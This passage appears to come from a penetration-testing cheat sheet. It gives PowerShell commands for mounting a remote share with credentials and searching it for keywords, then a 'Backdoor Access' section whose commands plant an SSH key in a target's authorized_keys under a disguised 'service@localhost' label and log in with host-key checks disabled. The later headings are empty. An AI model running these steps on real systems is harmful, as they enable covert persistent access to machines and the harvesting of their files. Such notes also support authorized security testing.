$secpassword = ConvertTo-SecureString -AsPlainText -Force '<PASSWORD>'
$cred = New-Object System.Management.Automation.PSCredential '<USERNAME>', $secpassword
New-PSDrive -PSProvider "FileSystem" -Credential $cred -Name "<DRIVE>" -Root "\\<TARGET>\<SHARE>"

# Search filenames
dir /s /b <DRIVE>:\*<KEYWORD>*
Get-ChildItem -Recurse -File -Path <DRIVE>:\ -Include *<KEYWORD>*

# Search keyword in files
findstr /s /i <KEYWORD> <DRIVE>:\*.*
Get-ChildItem -Recurse -Path <DRIVE>:\ | Select-String -List "<KEYWORD>"

```
## 🚪 Backdoor Access

```bash
# Attacker
ssh-keygen -f ./target_backdoor_key -N "" -C "service@localhost" && echo "\n\necho '$(cat ./target_backdoor_key.pub)' >> ~/.ssh/authorized_keys\n\n"

# Target: !!! RUN COMMAND ABOVE !!!

# Attacker
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./target_backdoor_key <USER>@<TARGET>
```

# 🔀 Lateral Movement

# 📝 Proof-of-Concept/Reporting

# ✅ Post-Engagement

